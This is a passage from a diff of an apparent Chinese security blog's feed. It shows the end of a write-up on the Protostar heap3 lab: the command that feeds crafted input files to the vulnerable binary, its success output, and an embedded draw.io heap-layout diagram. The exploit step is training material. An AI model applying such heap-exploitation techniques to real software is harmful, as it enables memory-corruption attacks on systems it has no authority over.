+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$ /opt/protostar/bin/heap3 &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/A&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;cat /tmp/B&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; ABCD
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;that wasn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t too bad now, was it? @ &lt;span class=&#34;m&#34;&gt;1648020034&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/finally.png&#34;
+	width=&#34;2678&#34;
+	height=&#34;630&#34;
+	srcset=&#34;/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_480x0_resize_box_3.png 480w, /p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;end&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;425&#34;
+		data-flex-basis=&#34;1020px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;最后附上 Senri 一开始为了方便理解画的图&amp;hellip;实际上并没有方便理解太多&lt;/p&gt;
+&lt;p&gt;大概只是觉得 &lt;a class=&#34;link&#34; href=&#34;https://app.diagrams.net&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;draw.io&lt;/a&gt; 这个网站画图很好玩&lt;/p&gt;
+&lt;p&gt;然后就很精确地把第一张图的每个小格子都对应到了 byte 大小x&lt;/p&gt;
+&lt;p&gt;结果只是浪费了很多时间罢了&lt;/p&gt;
+&lt;p&gt;不过可能对你会有帮助&amp;hellip;?&lt;/p&gt;
+&lt;p&gt;顺带一提如果这张图遇到了没法向下滑动的问题&amp;hellip;这时候请尽量在图片以外滑动x&lt;/p&gt;
 &lt;!--[if IE]&gt;&lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=5,IE=9&#34; &gt;&lt;![endif]--&gt;
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;head&gt;
-&lt;title&gt;Untitled Diagram&lt;/title&gt;
+&lt;title&gt;Untitled Diagram-6-7&lt;/title&gt;
 &lt;meta charset=&#34;utf-8&#34;/&gt;
 &lt;/head&gt;
-&lt;body&gt;&lt;div class=&#34;mxgraph&#34; style=&#34;max-width:100%;border:1px solid transparent;&#34; data-mxgraph=&#34;{&amp;quot;highlight&amp;quot;:&amp;quot;#0000ff&amp;quot;,&amp;quot;nav&amp;quot;:true,&amp;quot;resize&amp;quot;:true,&amp;quot;toolbar&amp;quot;:&amp;quot;zoom layers tags lightbox&amp;quot;,&amp;quot;edit&amp;quot;:&amp;quot;_blank&amp;quot;,&amp;quot;xml&amp;quot;:&amp;quot;&amp;lt;mxfile host=\&amp;quot;app.diagrams.net\&amp;quot; modified=\&amp;quot;2022-04-06T08:54:40.591Z\&amp;quot; agent=\&amp;quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&amp;quot; etag=\&amp;quot;dhEpq4yiQHziwCyBc8yo\&amp;quot; version=\&amp;quot;17.4.0\&amp;quot; type=\&amp;quot;device\&amp;quot;&amp;gt;&amp;lt;diagram id=\&amp;quot;9m9pWsRvkve3vRoIh5zU\&amp;quot; name=\&amp;quot;Page-1\&amp;quot;&amp;gt;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&amp;lt;/diagram&amp;gt;&amp;lt;/mxfile&amp;gt;&amp;quot;}&#34;&gt;&lt;/div&gt;
+&lt;body&gt;&lt;div class=&#34;mxgraph&#34; style=&#34;max-width:100%;border:1px solid transparent;&#34; data-mxgraph=&#34;{&amp;quot;highlight&amp;quot;:&amp;quot;#0000ff&amp;quot;,&amp;quot;target&amp;quot;:&amp;quot;blank&amp;quot;,&amp;quot;nav&amp;quot;:true,&amp;quot;resize&amp;quot;:true,&amp;quot;page&amp;quot;:0,&amp;quot;toolbar&amp;quot;:&amp;quot;pages zoom layers tags lightbox&amp;quot;,&amp;quot;edit&amp;quot;:&amp;quot;_blank&amp;quot;,&amp;quot;xml&amp;quot;:&amp;quot;&amp;lt;mxfile host=\&amp;quot;app.diagrams.net\&amp;quot; modified=\&amp;quot;2022-04-07T03:57:15.460Z\&amp;quot; agent=\&amp;quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&amp;quot; etag=\&amp;quot;2EIwbI9UyFxHR66eEPRj\&amp;quot; version=\&amp;quot;17.4.0\&amp;quot; type=\&amp;quot;device\&amp;quot; pages=\&amp;quot;2\&amp;quot;&amp;gt;&amp;lt;diagram id=\&amp;quot;9m9pWsRvkve3vRoIh5zU\&amp;quot; name=\&amp;quot;Page-1\&amp;quot;&amp;gt;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&amp;lt;/diagram&amp;gt;&amp;lt;diagram id=\&amp;quot;Yspwrotni0tyzMKoO_N9\&amp;quot; name=\&amp;quot;Page-2\&amp;quot;&amp;gt;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&amp;lt;/diagram&amp;gt;&amp;lt;/mxfile&amp;gt;&amp;quot;}&#34;&gt;&lt;/div&gt;
 &lt;script type=&#34;text/javascript&#34; src=&#34;https://viewer.diagrams.net/js/viewer-static.min.js&#34;&gt;&lt;/script&gt;
 &lt;/body&gt;
-&lt;/html&gt;
-</description>
+&lt;/html&gt;</description>
         </item>
         <item>
         <title>格式，参数，红宝石</title>
